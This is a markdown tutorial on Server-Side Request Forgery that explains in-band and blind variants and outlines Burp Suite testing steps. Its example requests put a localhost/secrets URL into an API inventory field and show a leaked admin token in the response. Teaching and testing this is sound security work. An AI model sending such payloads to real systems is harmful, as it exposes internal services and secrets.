# SSRF

## Types of SSRF

Server-Side Request Forgery (SSRF) vulnerabilities come in two main types: In-Band SSRF and Blind SSRF.

### In-Band SSRF

In-Band SSRF occurs when the server responds with the resources specified by the attacker. The attacker supplies a payload, and the server makes the request, responding with information served from the specified URL.

#### Example:

**Intercepted Request:**

```plaintext
POST api/v1/store/products
headers...
{
  "inventory": "http://store.com/api/v3/inventory/item/12345"
}
```

**Attack:**

```plaintext
POST api/v1/store/products
headers...
{
  "inventory": "http://localhost/secrets"
}
```

**Response:**

```plaintext
HTTP/1.1 200 OK
{
  "secret_token": "crapi-admin"
}
```

In this example, the server makes a request to the specified URL (`http://localhost/secrets`) and responds with the information from that URL.

### Blind SSRF

Blind SSRF occurs when the server makes a request from user input but does not send information from the specified URL back to the user. The attacker won't receive a direct response, and to confirm the attack, they need control over a web server to capture the request made by the target server.

#### Example:

**Intercepted Request:**

```plaintext
POST api/v1/store/products
headers...
{
  "inventory": "http://store.com/api/v3/inventory/item/12345"
}
```

**Attack:**

```plaintext
POST api/v1/store/products
headers...
{
  "inventory": "http://localhost/secrets"
}
```

**Response:**

```plaintext
HTTP/1.1 200 OK
{}
```

In this case, the server makes the request, but the response doesn't contain information from the specified URL. To confirm the attack, the attacker would need to control a web server and check for incoming requests.

#### Testing for Blind SSRF

To test Blind SSRF, tools like Burp Suite Collaborator or external services like [http://webhook.site](http://webhook.site/) can be used. These services provide a unique URL, and any requests made to this URL can be monitored.

1. Set up a test payload, including the unique URL from the testing service.
2. Send the payload to the target and check the testing service for any incoming requests.

## Ingredients for SSRF

When targeting an API for SSRF vulnerabilities, look for requests that:

* Include full URLs or URL paths in POST bodies or parameters.
* Include URLs in headers (e.g., Referer).
* Allow user input that may result in the server retrieving resources.

## Testing for SSRF

1. Proxy the target requests through a tool like Burp Suite.
2. Send the request to the Repeater tool to understand the typical response.
3. For Blind SSRF, use services like [http://webhook.site](http://webhook.site/) to monitor incoming requests.
4. Use tools like Pitchfork in Burp Suite to pair valid input with SSRF payloads.
5. Review responses for anomalies, unexpected status codes, or response lengths.
6. Confirm Blind SSRF attacks by checking the testing service for incoming requests.
